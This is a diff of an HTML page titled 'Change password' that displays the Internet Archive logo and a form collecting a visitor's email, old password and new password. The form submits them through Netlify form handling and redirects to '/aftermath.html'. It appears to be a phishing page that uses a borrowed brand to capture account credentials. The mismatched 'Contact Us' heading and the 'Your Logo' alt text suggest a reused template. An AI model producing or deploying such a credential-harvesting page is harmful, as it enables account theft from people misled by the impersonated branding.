@@ -1,14 +1,41 @@
-<form name="contact" method="POST" data-netlify="true" action="/aftermath.html">
-  <p>
-    <label>Your Email: <input type="email" name="email" required /></label>
-  </p>
-  <p>
-    <label>Old Password: <input type="password" name="old_password" required /></label>
-  </p>
-  <p>
-    <label>New Password: <input type="password" name="new_password" required /></label>
-  </p>
-  <p>
-    <button type="submit">Submit</button>
-  </p>
-</form>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Change password</title>
+    <style>
+        /* Add some basic styling */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            text-align: center;
+        }
+        img {
+            max-width: 150px; /* Adjust logo size */
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <img src="https://archive.org/embed/InternetArchiveLogo" alt="Your Logo" />
+    <h1>Contact Us</h1>
+
+    <form name="contact" method="POST" data-netlify="true" action="/aftermath.html">
+        <p>
+            <label>Your Email: <input type="email" name="email" required /></label>
+        </p>
+        <p>
+            <label>Old Password: <input type="password" name="old_password" required /></label>
+        </p>
+        <p>
+            <label>New Password: <input type="password" name="new_password" required /></label>
+        </p>
+        <p>
+            <button type="submit">Submit</button>
+        </p>
+    </form>
+
+</body>
+</html>
